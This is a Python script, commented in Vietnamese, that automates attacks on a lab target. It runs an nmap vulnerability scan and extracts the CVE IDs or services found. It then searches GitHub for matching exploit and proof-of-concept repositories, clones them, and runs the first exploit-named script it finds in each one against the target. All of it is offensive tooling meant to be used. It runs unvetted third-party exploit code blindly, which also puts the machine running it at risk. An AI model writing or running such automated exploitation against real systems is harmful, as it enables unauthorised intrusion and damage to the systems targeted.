import subprocess
import requests
import re
import os
import glob
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------- CONFIG ----------------
TARGET = "192.168.1.10"   # IP hoặc hostname trong lab
MAX_RESULTS = 2           # Số repo tối đa clone mỗi CVE/dịch vụ
SAVE_DIR = "exploits"     # Thư mục lưu repo
FILENAME_KEYWORDS = ["exploit", "poc", "proof"]
MAX_THREADS = 4            # Số luồng đồng thời
# -----------------------------------------

def scan_vuln(target):
    print("[*] Quét lỗ hổng với Nmap...")
    try:
        result = subprocess.check_output(
            ["nmap", "--script", "vuln", "-Pn", target],
            stderr=subprocess.DEVNULL
        ).decode()
    except FileNotFoundError:
        print("[-] Nmap chưa cài. sudo apt install nmap")
        return []

    matches = re.findall(r"(CVE-\d{4}-\d+)", result)
    if not matches:
        services = re.findall(r"^\d+/tcp\s+open\s+([a-zA-Z0-9\-_]+)", result, re.MULTILINE)
        matches = list(set(services))
    return list(set(matches))

def search_github(query):
    print(f"[*] Tìm trên GitHub: {query}")
    url = f"https://api.github.com/search/repositories?q={query}+exploit+poc+proof-of-concept&sort=stars&order=desc"
    r = requests.get(url, headers={"Accept": "application/vnd.github.v3+json"})
    if r.status_code != 200:
        print(f"[-] Lỗi GitHub API: {r.status_code}")
        return []
    data = r.json()
    results = []
    for item in data.get("items", []):
        results.append({
            "name": item["full_name"],
            "url": item["html_url"],
            "git_url": item["clone_url"],
            "stars": item["stargazers_count"],
            "desc": item["description"]
        })
    return results

def clone_repo(git_url, name):
    os.makedirs(SAVE_DIR, exist_ok=True)
    repo_dir = os.path.join(SAVE_DIR, name.replace("/", "_"))
    if os.path.exists(repo_dir):
        print(f"[!] Repo {name} đã tồn tại, bỏ qua.")
        return repo_dir
    print(f"[*] Đang clone {name}...")
    subprocess.run(["git", "clone", "--depth", "1", git_url, repo_dir])
    return repo_dir

def run_exploit(repo_dir, target):
    files = glob.glob(f"{repo_dir}/**/*", recursive=True)
    candidate_scripts = [f for f in files if f.endswith((".py", ".sh", ".pl")) and any(k in f.lower() for k in FILENAME_KEYWORDS)]

    if not candidate_scripts:
        print(f"[-] Không tìm thấy file exploit/PoC khả thi trong {repo_dir}.")
        return

    for script in candidate_scripts[:1]:
        print(f"[+] Thử chạy: {script}")
        try:
            if script.endswith(".py"):
                subprocess.run(["python3", script, target])
            elif script.endswith(".sh"):
                subprocess.run(["bash", script, target])
            elif script.endswith(".pl"):
                subprocess.run(["perl", script, target])
        except Exception as e:
            print(f"[-] Lỗi khi chạy {script}: {e}")

def process_repo(repo, target):
    repo_path = clone_repo(repo["git_url"], repo["name"])
    if repo_path:
        run_exploit(repo_path, target)

if __name__ == "__main__":
    findings = scan_vuln(TARGET)
    if not findings:
        print("[-] Không tìm thấy CVE hay dịch vụ nào.")
    else:
        print(f"[+] Phát hiện: {findings}")
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for vuln in findings:
                repos = search_github(vuln)
                if repos:
                    for repo in repos[:MAX_RESULTS]:
                        print(f"\n[{repo['stars']}★] {repo['name']}\n    {repo['url']}\n    {repo['desc']}")
                        futures.append(executor.submit(process_repo, repo, TARGET))
            # Đợi tất cả hoàn thành
            for future in as_completed(futures):
                future.result()
